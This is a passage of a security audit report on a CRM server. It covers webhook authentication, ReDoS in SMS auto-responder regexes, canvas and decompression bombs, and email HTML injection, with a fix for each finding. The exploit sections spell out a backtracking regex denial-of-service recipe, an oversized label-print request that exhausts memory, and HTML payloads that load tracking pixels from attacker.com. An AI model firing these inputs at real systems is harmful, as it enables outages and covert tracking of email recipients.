### [MEDIUM] Bandwidth webhook auth instructs operators to embed credentials in webhook URL — PII exposure in logs

**Where:** `packages/server/src/providers/sms/bandwidth.ts:117–140`

**What:**
`verifyWebhookSignature` implements Bandwidth's Basic-auth challenge-response by checking the `Authorization` header, but the server **returns 403 (not 401)** when no auth header is present. Bandwidth's challenge-response protocol expects a `401 WWW-Authenticate: Basic` response on the first unauthenticated request before resending with credentials. Because the server returns `403`, Bandwidth's retry never fires. The code comment instructs operators to embed credentials directly in the Bandwidth-configured webhook URL (`https://user:pass@yourserver.com/webhook`). This causes the username:password to appear in plaintext in: (a) Bandwidth's dashboard, (b) any server access logs, (c) reverse-proxy logs, and (d) browser history if operators paste the URL.

**Code:**
```typescript
// bandwidth.ts:135-140
// SECURITY: Bandwidth webhook URLs must include Basic auth credentials in the URL
// (e.g., https://user:pass@yourserver.com/webhook) so Bandwidth sends them on every request.
// Without auth, any party who discovers the webhook URL can inject fake messages.
console.warn('[Bandwidth] Webhook request has no Authorization header. Rejecting...');
return false;
// ← server sends 403; Bandwidth challenge-response never completes
```

**Exploit:**
(1) Functional: Bandwidth webhooks configured without URL-embedded credentials always fail with 403; Bandwidth does not retry. All inbound SMS and delivery status events from Bandwidth are silently dropped. (2) Credential exposure: operators who follow the comment's guidance embed their Bandwidth `username:password` in the URL, which Bandwidth logs on their side and which appears in any server access log middleware that logs the full request URL.

**Fix:**
Implement the `WWW-Authenticate` challenge correctly: when no `Authorization` header is present, return `401` with `WWW-Authenticate: Basic realm="Bandwidth webhook"`. Bandwidth's retry will then include the `Authorization` header with the configured credentials. Remove the guidance to embed credentials in the URL. Alternatively, adopt Bandwidth's newer API key + HMAC authentication (available in their v2 messaging API) which does not require a challenge round-trip.

---

### [LOW] Stripe BL1 freshness check is redundant with `constructEvent` tolerance — clock-skew gap if one changes

**Where:** `packages/server/src/services/stripe.ts:528–539` (`verifyWebhook`), `stripe.ts:711–733` (`handleWebhookEvent` BL1)

**What:**
`verifyWebhook` calls `stripe.webhooks.constructEvent` with `tolerance = WEBHOOK_TOLERANCE_SECONDS = 300`. The Stripe SDK internally rejects events where `event.created` is more than 300s in the past (or future). Then `handleWebhookEvent` performs a second freshness check using the same 300s constant. Because both checks use the same constant, the BL1 check in `handleWebhookEvent` is unreachable dead code — any event that passes `constructEvent` already satisfies BL1. If the tolerance is later increased (e.g., for clock-drifted deployments), BL1 would still enforce 300s — creating a hidden conflict where `verifyWebhook` admits events that `handleWebhookEvent` silently drops, with no error surfaced to the caller.

**Code:**
```typescript
// stripe.ts:528-539
const WEBHOOK_TOLERANCE_SECONDS = 300;
export function verifyWebhook(payload: Buffer, signature: string): Stripe.Event {
  return stripe.webhooks.constructEvent(payload, signature, secret, WEBHOOK_TOLERANCE_SECONDS);
  // ← already enforces 300s tolerance internally
}
// stripe.ts:724-733
const ageSeconds = nowSeconds - eventCreated;
if (ageSeconds > WEBHOOK_MAX_AGE_SECONDS) { // WEBHOOK_MAX_AGE_SECONDS = 300 — redundant
  logger.error('Rejecting stale Stripe webhook (replay protection)...');
  return;
}
```

**Exploit:**
No direct exploit today. If `WEBHOOK_TOLERANCE_SECONDS` is raised for a deployment with clock skew (common in VMs), events that Stripe considers valid (e.g., 600s old) pass `constructEvent` but are silently dropped by BL1 without a logged error. Stripe continues retrying; the tenant's plan is never updated. The operator sees Stripe reporting successful delivery while the server silently discards events — a debugging nightmare.

**Fix:**
Remove the `WEBHOOK_MAX_AGE_SECONDS` check in `handleWebhookEvent` and add a comment explaining that `constructEvent` is the authoritative freshness guard. If an extra application-layer check is desired for future-dated events (BL1's other case), ensure the constant is sourced from `WEBHOOK_TOLERANCE_SECONDS` so both checks are always in sync.

---

### [INFO] Stripe webhook event dedup retention (30 days) exceeds tolerance window (300s) — correctly calibrated

**Where:** `packages/server/src/db/master-connection.ts:290–302`, `packages/server/src/index.ts:2656–2675`

**What:**
`pruneStripeWebhookEvents(30)` runs daily and deletes rows older than 30 days. Stripe's maximum retry window is 72 hours. The idempotency table therefore retains event IDs for 30 days while Stripe only retries for 72 hours, providing ~10× safety margin. The `processed_at` column is indexed; the daily DELETE is efficient. No issue.

**Code:**
```typescript
// master-connection.ts:290-302
export function pruneStripeWebhookEvents(retentionDays = 30): number {
  const cutoff = new Date(Date.now() - retentionDays * 86_400_000).toISOString()...;
  return masterDb.prepare('DELETE FROM stripe_webhook_events WHERE processed_at < ?').run(cutoff).changes;
}
// 30 days retention >> 72h Stripe retry window >> 300s tolerance — correctly calibrated
```

**Exploit:**
N/A — this is a positive finding documenting that dedup retention is adequate.

**Fix:**
No action needed. Document that if `WEBHOOK_TOLERANCE_SECONDS` is raised, `pruneStripeWebhookEvents` retention should remain > Stripe's retry window (currently 72h). Note: pruning only runs in `config.multiTenant` mode; in single-tenant mode the table is never written to (getMasterDb returns null), so there is no unbounded growth in single-tenant deployments.

---

## SCOPE CLEARED — Items verified safe

- **Stripe `constructEvent` tolerance**: explicitly set to `300` at `stripe.ts:528`; not overridden to 24h or any other value. Verified.
- **Stripe `req.body` is a Buffer, not parsed JSON**: Stripe webhook is mounted at `index.ts:1212` with `express.raw()` _before_ `express.json()`. `verifyWebhook` receives `payload: Buffer` and passes it directly to `constructEvent`. No JSON-parsed body mutation is possible on this path.
- **Telnyx timestamp freshness**: `telnyx.ts:110–113` enforces `Math.abs(Date.now()/1000 - tsNum) > 300` — 5-minute window enforced. `rawBody` captured by `express.json` verify callback (Telnyx sends JSON). Correctly implemented.
- **Vonage Messages API JWT expiry**: `jwt.verify` at `vonage.ts:34` enforces `exp` from the token by default. `rawBody` required check at `vonage.ts:277–284` fails closed if missing. Correctly implemented.
- **Twilio `timingSafeEqual`**: used at `twilio.ts:110`; length check before comparison prevents panic. Correctly implemented.
- **Plivo `timingSafeEqual`**: used at `plivo.ts:111–112`; base64-decoded buffers compared. Correctly implemented.
- **Stripe dedup retention vs. tolerance**: 30-day retention vs. 300s tolerance — 30 days safely covers Stripe's 72-hour retry window. Correctly calibrated (see INFO finding above).
- **BlockChyp callbacks**: BlockChyp is a point-of-sale terminal SDK; it does not deliver inbound HTTP callbacks to the server. The `blockchyp.routes.ts` is an outbound-only API (process-payment, capture-signature, etc.). No inbound webhook attack surface exists for BlockChyp. The "migration #159" referenced in the slot prompt does not exist in the current codebase (migrations only reach #154).


---

# T12-redos

# T12 — Regular-Expression Denial of Service (ReDoS)

**Auditor:** T12 slot  
**Scope:** `packages/server/src/` — regex patterns evaluated against user-controlled input  
**Files read end-to-end:** `utils/validate.ts`, `utils/phone.ts`, `utils/escape.ts`, `utils/xml.ts`, `utils/format.ts`, `services/email.ts`, `services/catalogScraper.ts`, `services/repairDeskImport.ts`, `services/repairShoprImport.ts`, `services/myRepairAppImport.ts`, `services/automations.ts`, `services/smsAutoResponderMatcher.ts`, `middleware/fileUploadValidator.ts`, `routes/smsAutoResponders.routes.ts`, `routes/sms.routes.ts`, `index.ts`  
**Dynamic `new RegExp()` calls:** exactly 2, both in the SMS auto-responder feature

---

### [HIGH] ReDoS guard bypassable via overlapping-alternation patterns in SMS auto-responders

**Where:**  
- `packages/server/src/routes/smsAutoResponders.routes.ts:78` (write-time guard)  
- `packages/server/src/services/smsAutoResponderMatcher.ts:97` (eval-time guard)  
- Trigger path: `packages/server/src/routes/sms.routes.ts:1091` (public webhook)

**What:**  
The heuristic ReDoS guard `if (/\([^)]*[+*][^)]*\)[+*]/.test(raw))` at both the create-time validation and the eval-time matcher only rejects patterns where a quantifier (`+` or `*`) appears **inside** the capture/non-capture group before its closing `)`. It completely misses the classic exponential-backtracking pattern where two alternation branches of **different lengths** overlap, such as `(a|aa)+`, `(?:a|aa)+`, and `(hello|helloworld)+`. These patterns have no `+`/`*` inside the group — they use alternation `|` — so the guard's inner `[^)]*[+*][^)]*` sub-pattern never matches. Empirically tested on Node.js v22: `(a|aa)+$` takes ~3 ms at N=20, ~35 ms at N=30, ~429 ms at N=35, and would be astronomically slow at the 1600-char SMS body cap (body is capped but not the regex execution time). The same bypassed pattern is accepted at creation, stored in `sms_auto_responders.rule_json`, loaded at webhook time, and executed synchronously on the Node.js main thread with no per-regex timeout.

**Code:**
```typescript
// smsAutoResponders.routes.ts:70–89  (write-time)
function validateMatchPattern(raw: unknown): RegExp {
  if (raw.length > 500) throw new AppError('match pattern exceeds 500 chars', 400);
  // ← BYPASS: (a|aa)+ has no + or * inside the group, so this check passes
  if (/\([^)]*[+*][^)]*\)[+*]/.test(raw)) {
    throw new AppError('match pattern has nested quantifiers (ReDoS risk)', 400);
  }
  return new RegExp(raw, 'i');  // stored in DB
}

// smsAutoResponderMatcher.ts:97–105  (eval-time, public webhook path)
if (/\([^)]*[+*][^)]*\)[+*]/.test(rule.match)) { // same guard — same bypass
  return false;
}
const re = new RegExp(rule.match, flags);
const capped = body.length > 1600 ? body.slice(0, 1600) : body;
return re.test(capped);  // synchronous on main event loop, no timeout
```

**Exploit:**  
A tenant manager or admin (role gate at create time: `requireManagerOrAdmin`) stores the pattern `(a|aa)+$` via `POST /api/v1/sms/auto-responders`. An external attacker (or the same actor) then posts to the **unauthenticated** SMS inbound webhook `POST /api/v1/sms/inbound-webhook` with a body of 35+ `a` characters. The matcher runs `(a|aa)+$` against the body synchronously on the main thread — N=35 takes ~430 ms, and N=50 would take seconds — stalling all tenant I/O on the shared Node.js process. At 60 requests/minute (the webhook rate limit) the event loop is effectively monopolized.

**Fix:**  
Replace the hand-rolled heuristic with the [`safe-regex2`](https://www.npmjs.com/package/safe-regex2) or [`recheck`](https://makenowjust-labs.github.io/recheck/) npm package (both detect exponential-backtracking patterns including overlapping alternation). Alternatively, run the compiled regex against a short synthetic probe string (`'a'.repeat(50) + '!'`) inside a `Worker` thread with an `AbortController` timeout (e.g. 100 ms) before storing it in the DB. As defense-in-depth, compile stored regex patterns in a `Worker` thread at eval time rather than on the main event loop so a slow match cannot stall request handling.

---

### [MEDIUM] `sanitizeEmailHtml` regex pipeline applied to uncapped input before size enforcement

**Where:** `packages/server/src/services/email.ts:173–178`

**What:**  
`sanitizeEmailHtml` runs five successive `.replace()` calls on the raw HTML before the 200 KB byte-length cap is enforced (line 182). Each individual regex is structurally safe (no nested quantifiers, anchored character classes), but the pipeline still allocates multiple intermediate strings from the full uncapped input. An automation template that embeds a multi-megabyte inline `<style>` block passes all five regex scans, each touching every byte of the payload, before the truncation cap fires. On a slow SMTP path this causes unnecessary CPU and GC pressure, and the `sendEmail` caller (`automations.ts`, `notifications.ts`) receives the full opts.html without any upstream size gate.

**Code:**
```typescript
function sanitizeEmailHtml(raw: string): string {
  if (!raw) return '';
  let out = raw;
  out = out.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  out = out.replace(/\s+on[a-z]+\s*=\s*"[^"]*"/gi, '');
  out = out.replace(/\s+on[a-z]+\s*=\s*'[^']*'/gi, '');
  out = out.replace(/\s+on[a-z]+\s*=\s*[^\s>]+/gi, '');
  out = out.replace(/(href|src)\s*=\s*"\s*javascript:[^"]*"/gi, '$1="#"');
  out = out.replace(/(href|src)\s*=\s*'\s*javascript:[^']*'/gi, "$1='#'");
  // ← cap enforced AFTER all five regex passes on the full raw buffer
  if (Buffer.byteLength(out, 'utf8') > EMAIL_HTML_MAX_BYTES) {
    out = out.slice(0, EMAIL_HTML_MAX_BYTES);
  }
  return out;
}
```

**Exploit:**  
A tenant admin saves an automation email template with a 5 MB HTML blob. On each triggered automation send, five regex passes run over the full 5 MB before any truncation, each producing a new intermediate string — consuming ~25–50 MB of heap per email send and increasing GC pressure under concurrent automation runs.

**Fix:**  
Add an early byte-length guard before the regex pipeline: `if (Buffer.byteLength(raw, 'utf8') > EMAIL_HTML_MAX_BYTES) raw = raw.slice(0, EMAIL_HTML_MAX_BYTES);`. This bounds regex input to 200 KB unconditionally, eliminating the multi-MB processing window.

---

## SCOPE CLEARED — Patterns confirmed safe

The following were examined and found to have no exploitable ReDoS exposure:

- **`utils/validate.ts` — `validateEmail` regex** (`/^[^\s@.]+(?:\.[^\s@.]+)*@…$/`): Guarded by an explicit `local.length > 64` / `domain.length > 253` pre-cap (lines 105–106) before the regex runs, capping input to ≤318 chars. Empirically < 1 ms at maximum length.

- **`utils/validate.ts` — `validateIsoDate` regex** (`/^\d{4}-\d{2}-\d{2}(T…)?$/`): Nested optionals but all alternation branches use fixed-length digit sequences (`\d{2}`, `\d{4}`). Tested at 100,000 fractional digits: < 1 ms (linear scan).

- **`utils/phone.ts` — `normalizePhone` / `redactPhone`**: Only use `/\D/g` (single negated class, global replace) — structurally linear.

- **`utils/escape.ts` — `escapeHtml` / `stripSmsControlChars`**: Character-class alternation in a lookup table; no nested quantifiers.

- **`utils/xml.ts` — `escapeXml`**: Sequential single-char `.replace()` calls; no quantifier nesting.

- **`utils/format.ts` — `formatCurrency`**: `/^[A-Z]{3}$/` applied to a trimmed 3-char currency string — provably O(1).

- **`services/catalogScraper.ts` — `parseCompatibleDevices`**: Lazy quantifier `[^,\-–\(]+?` with non-overlapping terminator set; tested at 5000-char input < 1 ms.

- **`services/catalogScraper.ts` — private-IP check**: `^`-anchored alternation on `parsed.hostname` after `new URL()` — fast fail at position 0.

- **`middleware/fileUploadValidator.ts`**: No user-controlled regex patterns; file content validation uses magic-byte comparison, not regex.

- **`index.ts` — static-asset extension regex** (`/\.(css|js|…)$/i`): `$`-anchored alternation with non-overlapping fixed extensions; tested at 50,000-char path: < 1 ms.

- **`services/repairDeskImport.ts` / `repairShoprImport.ts` / `myRepairAppImport.ts`**: Column-name regexes (`/^[a-z_]+$/`) applied to internal hardcoded values only, not user input. HTML-stripping `/<[^>]*>/g` is structurally linear (non-overlapping negated class).

- **Third-party deps**: No `validator` package is installed (`package.json` confirmed). No external regex library (safe-regex, re2) is present. The only user-pattern-to-regex path is the SMS auto-responder feature documented above.


---

# T13-decompression-bombs

# T13 — Decompression Bombs (zip, gzip, image, PDF, JSON, XML)

**Auditor:** T13 slot  
**Scope:** `packages/server/src/` — all decompression/expansion bomb vectors  
**Files read end-to-end:** `services/receiptOcr.ts`, `services/walletPass.ts`, `services/myRepairAppImport.ts`, `services/repairDeskImport.ts`, `services/repairShoprImport.ts`, `services/backup.ts`, `services/tenantExport.ts`, `services/catalogScraper.ts`, `middleware/fileUploadValidator.ts`, `utils/fileValidation.ts`, `utils/xml.ts`, `index.ts`, `routes/inventoryEnrich.routes.ts`, `routes/inventory.routes.ts`, `routes/sms.routes.ts`, `routes/settings.routes.ts`, `routes/bench.routes.ts`, `routes/expenses.routes.ts`, `routes/expenseReceipts.routes.ts`, `routes/estimateSign.routes.ts`, `routes/ticketSignatures.routes.ts`, `routes/import.routes.ts`  
**body-parser internals inspected:** `lib/read.js` (contentstream), `lib/types/json.js`; `raw-body/index.js` (streaming limit check)  
**node-canvas limits confirmed:** max height 32,767 pixels (empirically tested on installed version)

---

### [MEDIUM] PDF label-print canvas allocation bomb — main-thread OOM, any authenticated user

**Where:** `packages/server/src/routes/inventoryEnrich.routes.ts:1205` (no role gate, just `authMiddleware`)  
`packages/server/src/index.ts:1625` (`app.use('/api/v1/inventory-enrich', authMiddleware, inventoryEnrichRoutes)`)

**What:**  
`POST /api/v1/inventory-enrich/labels/print` with `format:"pdf"` creates a single tall PDF canvas whose height is `96 × (item_count × copies_per_item)`. `item_count` is bounded to 500 (via `validateArrayBounds`) and `copies_per_item` is capped at 10, yielding a theoretical canvas of 288 × 480,000 px. node-canvas enforces a 32,767-pixel ceiling so requests with more than ~34 items at 10 copies per item (≥ 342 total labels) throw `"Canvas height cannot exceed 32767"` synchronously on the main event loop. Below that ceiling a request with 341 labels allocates a 36 MB main canvas plus up to 18.9 MB of per-label barcode canvases (268 × 52 px each), totalling ~55 MB of synchronous main-thread allocation per request. The endpoint has **no rate limit** and **no role gate** (only `authMiddleware`), so any authenticated technician can call it at the global 300 req/min cap.

**Code:**
```typescript
// inventoryEnrich.routes.ts:1280–1320
const PX_W = 288;
const PX_H = 96;
const totalH = PX_H * totalLabels;           // 96 × (items.length × copies) ← unbounded

const canvas = createCanvas(PX_W, totalH, 'pdf');   // ← throws or allocates up to 36 MB
// ... per-label loop:
const barcodeCanvas = createCanvas(PX_W - 20, 52);  // ← 341 × 55 KB = 18.9 MB
```

**Exploit:**  
An authenticated technician (lowest-privilege role) sends `POST /api/v1/inventory-enrich/labels/print` with `{"item_ids":[1,2,...,35],"copies_per_item":10,"format":"pdf"}`. With 35 items × 10 copies = 350 labels the canvas constructor throws on the main thread, returning HTTP 500 to all concurrent requests. Alternatively, with 34 items × 10 copies = 340 labels, ~55 MB of canvas memory is allocated synchronously per request; at 300 req/min the GC contention causes measurable latency spikes for all tenants sharing the process.

**Fix:**  
Add a `totalLabels` ceiling before `createCanvas` (e.g. `if (totalLabels > 100) throw new AppError('Too many labels per request', 400)` — or match the printer page limit). Move canvas rendering to a piscina worker thread so a large or crashing allocation cannot stall the main event loop. Add a per-user rate limit (e.g. 10 req/min) on this endpoint.

---

## SCOPE CLEARED — remaining vectors investigated

1. **Zip bomb (import services):** `package.json` for the server lists zero zip-extraction libraries (`adm-zip`, `jszip`, `yauzl`, `unzipper`, `node-tar` are all absent). `repairDeskImport.ts`, `repairShoprImport.ts`, and `myRepairAppImport.ts` pull data from remote APIs via HTTP — no file upload, no archive extraction. `backup.ts` writes AES-256-GCM `.enc` files and decrypts them with `crypto.createDecipheriv`; it never calls an archive extraction API. `tenantExport.ts` builds a raw PKZIP buffer with a custom `buildZip()` writer — no extraction path exists.

2. **Gzip bomb via `Content-Encoding: gzip`:** `body-parser/lib/read.js` pipes gzip bodies through `zlib.createGunzip()` and passes `length = undefined` (not the compressed Content-Length) to `raw-body`. `raw-body` skips the pre-check (length is null) but enforces the `limit` counter **during streaming** (`if (limit !== null && received > limit)`). A 1 KB compressed body that decompresses beyond the 1 MB / 10 MB parser limit is rejected on the first chunk that crosses the threshold. The decompressed bytes already buffered at that point are bounded by the configured limit. The rate limiter (300 req/min) precedes body parsing (`index.ts:1181`), providing a second line of defence.

3. **JSON bomb (deep nesting):** Node.js v22.22.2 `JSON.parse` handles 200,000-deep nesting (1.2 MB JSON) without stack overflow or OOM — tested empirically (parses in ~5 ms). The global `express.json({ limit: '1mb' })` and the 10 MB carve-out for `/catalog/bulk-import` (admin-only) bound input size before parse. The catalog bulk-import flat-array payload (5 000 items × 500 bytes = 2.5 MB) parses in ~5 ms with no event-loop impact.

4. **Image bomb (sharp):** The only sharp call is `sms.routes.ts:141` which correctly sets `{ limitInputPixels: 24_000_000, failOn: 'error' }`, capping decoded pixels at 24 MP. All other image upload routes (logo, inventory photos, bench QC, shrinkage photos, expense receipts) store files on disk without decoding pixel data — no canvas or sharp processing path. Receipt OCR uses `tesseract.js` which is not installed (`package.json` omits it); the cron stub marks OCR jobs failed without calling any image decoder.

5. **PDF bomb:** No PDF parsing library (`pdf-parse`, `pdf-lib`, `pdfjs-dist`) is installed. All `/reports/*.pdf` endpoints generate PDFs via canvas output (`canvas.toBuffer('application/pdf')`). The portal "receipt.pdf" and "warranty.pdf" routes return HTML (comment in code: "pdfkit/puppeteer are not installed"). `fileValidation.ts` has a PDF magic-byte entry (for future use) but no upload route in the current codebase accepts `application/pdf` as an allowed MIME.

6. **XML bomb (entity expansion):** The server generates TwiML/BXML/PlivoXML via `utils/xml.ts:escapeXml()` (pure string substitution, no parser). No incoming XML is parsed: there is no `xml2js`, `fast-xml-parser`, `xmldom`, `sax`, or `DOMParser` call anywhere in `packages/server/src/`. The voice webhook handlers receive JSON or URL-encoded bodies, not XML.

7. **SVG bomb:** `estimateSign.routes.ts` accepts `data:image/svg+xml;base64,...` up to 200 KB and stores it verbatim as a base64 string in the DB — it is never decoded or parsed server-side. No XML entity expansion is possible.

8. **Brotli bomb:** `body-parser/lib/read.js:contentstream()` handles only `deflate`, `gzip`, and `identity` in its switch statement. A request with `Content-Encoding: br` falls to the default branch and returns 415 Unsupported Content Encoding, rejecting it before any decompression attempt.

9. **HEIC/HEIF upload:** `expenseReceipts.routes.ts` lists `image/heic` in `ALLOWED_RECEIPT_MIMES` and the multer filter, but `fileValidation.ts:SIGNATURES` contains no HEIC magic-byte entry. `fileUploadValidator` therefore rejects HEIC files with 400 "Unrecognized file signature". This is safe (though it creates a mismatch between multer's filter and the downstream validator).

10. **Backup decryption size:** `backup.ts:decryptFile()` reads the full encrypted file into a `Buffer` with no pre-size cap, but the backup directory is admin-configured and locally written by the server's own `runBackup()` (bounded by the tenant's actual DB size). No external upload path reaches this function; restore only operates on files that already exist in the local `backupDir`.

---


---

# T14-email-header-inject

# T14 — Email Header Injection (CRLF) + Attachment Filename Injection

**Scope reviewed:**
- `packages/server/src/services/email.ts` — full
- `packages/server/src/routes/auth.routes.ts` — password reset email path
- `packages/server/src/routes/settings.routes.ts` — SMTP config endpoints
- `packages/server/src/routes/notifications.routes.ts` — receipt email
- `packages/server/src/routes/campaigns.routes.ts` — campaign dispatch
- `packages/server/src/services/notifications.ts` — ticket status notification
- `packages/server/src/services/dunningScheduler.ts` — dunning emails
- `packages/server/src/services/scheduledReports.ts` — daily report
- `packages/server/src/services/reportEmailer.ts` — weekly summary
- `packages/server/src/services/dataExportScheduleCron.ts` — export schedule
- `packages/server/src/services/automations.ts` — automation engine
- `packages/server/src/services/tenantTermination.ts` — termination email
- `packages/server/src/middleware/stepUpTotp.ts` — PII export email

**nodemailer version:** `^8.0.4` — no known critical CVEs; RFC 2822 address parsing sanitizes CRLF in To/From header fields before wire encoding. Raw CRLF injection via nodemailer's address-parser is not achievable on this version.

---

### MEDIUM `smtp_from` stored without email-format validation via `PUT /store`

**Where:** `packages/server/src/routes/settings.routes.ts:570–598` and `packages/server/src/services/email.ts:84–86`

**What:**
`PUT /settings/store` accepts `smtp_from` in its allowlist (line 578) but does **not** call `validateConfigValue()` — the function that enforces `EMAIL_RE` on `smtp_from`. The companion endpoint `PUT /settings/config` (line 482) correctly validates `smtp_from` through `EMAIL_SETTINGS` → `EMAIL_RE`. As a result an admin can store any arbitrary string (including display-name format such as `"ACME Shop" <relay@acme.com>`) in `smtp_from`. In `email.ts` `getSmtpConfig()`, when `from_email` fails `EMAIL_FROM_RE`, the code falls through to `smtpFrom` **without any format check** (line 84–86) and passes it directly as the nodemailer `from` field. nodemailer's addressparser prevents wire-level CRLF injection, but the stored value may spoof the display-name portion of the From header arbitrarily.

**Code:**
```typescript
// settings.routes.ts:578 — PUT /store (no validateConfigValue call)
const allowed = ['store_name','address','phone','email','timezone','currency',
  'tax_rate','receipt_header','receipt_footer','logo_url','sms_provider',
  'tcx_host','tcx_extension','tcx_password',
  'smtp_host','smtp_port','smtp_user','smtp_from','business_hours','store_logo'];
for (const [key, value] of Object.entries(req.body)) {
  if (!allowed.includes(key)) continue;
  const strVal = value;                             // no EMAIL_RE check
  const storedVal = ENCRYPTED_CONFIG_KEYS.has(key) ? encryptConfigValue(strVal) : strVal;
  await adb.run('INSERT OR REPLACE INTO store_config (key, value) VALUES (?, ?)', key, storedVal);
}

// email.ts:84-86 — smtp_from fallback, no validation
} else if (smtpFrom) {
  from = smtpFrom;   // used as-is without EMAIL_FROM_RE test
  fromSource = 'smtp_from';
}
```

**Exploit:**
A tenant admin issues `PUT /settings/store` with `smtp_from: "Legitimate Bank <billing@bank.example.com>"`. Every outbound email from that tenant then carries `From: "Legitimate Bank <billing@bank.example.com>"` regardless of the SMTP relay's actual sender, enabling display-name spoofing on all automated emails (receipts, dunning, password resets). Nodemailer prevents raw CRLF from reaching the wire, so multi-line header injection is not achieved; only display-name spoofing.

**Fix:**
Apply `validateConfigValue('smtp_from', value)` inside the `PUT /store` handler's loop (same as `PUT /config`) before persisting the value. Alternatively, call `EMAIL_FROM_RE.test(smtpFrom)` in `getSmtpConfig()` before using the fallback and log + skip if invalid.

---

### LOW HTML injection into PII-export notification email via `User-Agent` header

**Where:** `packages/server/src/middleware/stepUpTotp.ts:175–178`

**What:**
`firePiiExportEmail()` interpolates `userAgent` (from `req.headers['user-agent']`) directly into an HTML email body without calling `escapeHtml`. The downstream `sanitizeEmailHtml()` in `email.ts` strips `<script>` blocks and `on*=` event handlers but **does not strip arbitrary structural HTML tags** such as `<img>`. An authenticated user who performs a TOTP-gated PII export with a crafted `User-Agent` header will receive their own security-alert email containing the injected HTML.

**Code:**
```typescript
// stepUpTotp.ts:172-181
const body = `
<p>A PII export was completed on your BizarreCRM account.</p>
<ul>
  <li><strong>Endpoint:</strong> ${endpoint}</li>
  <li><strong>IP address:</strong> ${ip}</li>
  <li><strong>User-Agent:</strong> ${userAgent}</li>   // ← raw, no escapeHtml
  <li><strong>Timestamp (UTC):</strong> ${timestamp}</li>
</ul>
...`.trim();
```

**Exploit:**
An authenticated user sets `User-Agent: </li><img src="//attacker.com/track.gif"><li>` and triggers a PII export. The security-alert email they receive contains a tracking pixel that fires when they open the email, confirming the email address is active. In practice the victim is the attacker themselves (the email goes to `dbUser.email` — the requesting user's own address), so cross-user impact is none. Email forwarding, archiving systems, or audit displays that render the body raw could be affected.

**Fix:**
Replace `${userAgent}` with `${escapeHtml(userAgent)}` (and `${escapeHtml(ip)}` for consistency). `escapeHtml` is already imported from `utils/escape.js` in the same file.

---

### LOW Raw `username` interpolated into password-reset email HTML body

**Where:** `packages/server/src/routes/auth.routes.ts:1759`

**What:**
The password-reset email is built with template literal `<p>Hi ${user.username},</p>…` without calling `escapeHtml`. `user.username` is whatever is stored in the `users` table, which can be set to any string by an admin via `POST /settings/users` (admin-only, no HTML-escaping enforced at storage). `sanitizeEmailHtml()` in `sendEmail()` strips `<script>` and `on*` handlers but passes `<img src=//external>` and other structural tags through unchanged.

**Code:**
```typescript
// auth.routes.ts:1759
html: `<p>Hi ${user.username},</p>
<p>Click the link below to reset your password. This link expires in 1 hour.</p>
<p><a href="${resetUrl}">${resetUrl}</a></p>
<p>If you didn't request this, you can safely ignore this email.</p>`,
```

**Exploit:**
An admin creates a user account with `username: '<img src=//attacker.com/px.gif>'`. When that user's password is reset, their reset-email contains a tracking pixel. Impact is limited: the admin can already change the user's email address and thus control what the user receives; the username injection provides no privilege escalation. Severity is LOW due to the admin-only precondition.

**Fix:**
Wrap `user.username` with `escapeHtml(user.username)`. The import is already present in `auth.routes.ts` via `utils/escape.js`.

---

### LOW `schedule.name` interpolated raw into export-delivery email HTML

**Where:** `packages/server/src/services/dataExportScheduleCron.ts:231–234`

**What:**
The delivery-email body for a completed data-export schedule injects `schedule.name` directly into HTML (`<strong>${schedule.name}</strong>`) and also into the email subject (`Data export ready — ${schedule.name}`). The subject is protected by `sanitizeSubject()` in `sendEmail()`, but the HTML body only passes through `sanitizeEmailHtml()` which does not escape arbitrary HTML tags. Any admin who can create an export schedule can craft a `name` that embeds structural HTML (e.g. `<img>` tags) in the delivery email sent to whatever `delivery_email` they configure.

**Code:**
```typescript
// dataExportScheduleCron.ts:229-240
await sendEmail(db, {
  to: schedule.delivery_email,
  subject: `Data export ready — ${schedule.name}`,      // sanitized by sanitizeSubject()
  html: [
    `<p>Your scheduled data export "<strong>${schedule.name}</strong>" has completed.</p>`,
    `<ul>`,
    `<li>Export type: ${exportType}</li>`,               // enum-validated — safe
    `<li>Rows exported: ${rowCount.toLocaleString()}</li>`,
    `<li>File: ${fileName}</li>`,
    `</ul>`,
  ].join(''),
});
```

**Exploit:**
An admin creates an export schedule with `name: "</strong><img src=//attacker.com/t.gif>"` and sets `delivery_email` to a colleague's inbox. When the schedule fires, the colleague receives a report email with an embedded tracking pixel. This requires admin access and the colleague must be someone the admin can legitimately send automated email to, limiting real-world impact.

**Fix:**
Replace `${schedule.name}` in the HTML body with `${escapeHtml(schedule.name)}`. `escapeHtml` is available from `utils/escape.js` — add the import to `dataExportScheduleCron.ts`.

---

## SCOPE CLEARED — items investigated and found safe

- **Subject-line CRLF injection (all callers):** `sendEmail()` applies `sanitizeSubject()` which calls `s.replace(/[\r\n]+/g, ' ')` before nodemailer sees the value. All callers — dunning, campaigns, notifications, scheduledReports, auth — pass through this guard.
- **nodemailer To/From CRLF injection:** nodemailer `^8.0.4` parses all address fields through its RFC 2822 addressparser before writing to the SMTP socket. Raw CR/LF bytes in `to` or `from` are either stripped or cause the send to throw (caught by the try/catch in `sendEmail()`). No raw wire-level injection is achievable.
- **nodemailer CVE exposure:** `^8.0.4` carries no known critical CVEs as of the audit date.
- **Custom `headers:` object passed to `sendMail()`:** The single `sendMail()` call site (`email.ts:224–230`) passes only `from`, `to`, `subject`, `html`, `text` — no `headers` key, no replyTo, no attachments, no custom extension headers.
- **`from_email` via `PUT /config`:** Correctly validated against `EMAIL_FROM_RE` through `validateConfigValue()` → `EMAIL_SETTINGS` set before persistence.
- **Attachment filename injection:** No `attachments` property is passed in any `sendMail()` call. The `SendEmailOptions` interface does not include attachments. No attachment filename injection surface exists.
- **Return-Path / SMTP DSN abuse:** nodemailer uses the SMTP auth credentials as the MAIL FROM envelope; there is no code path that sets a user-controlled `envelope.from` or `Return-Path` header.
- **Dunning and automation template subject injection:** All dunning subjects flow through `renderTemplate()` (no escape) into `sendEmail()` where `sanitizeSubject()` strips CRLF. The HTML body uses `renderTemplate(..., 'html')` which applies `escapeHtml` to all variable substitutions.
- **Notification template injection (notifications.ts):** `escapeHtml` applied to all customer-controlled variables before email body construction (lines 527–544).
- **tenantTermination email:** Uses `escapeHtml(opts.adminUsername)` explicitly (line 533).
- **Campaigns template subject/body:** Subject uses `renderTemplate` (raw) but is sanitized by `sanitizeSubject()` at send; HTML body uses `renderTemplateHtml` which applies `escapeHtml` to all substituted values.
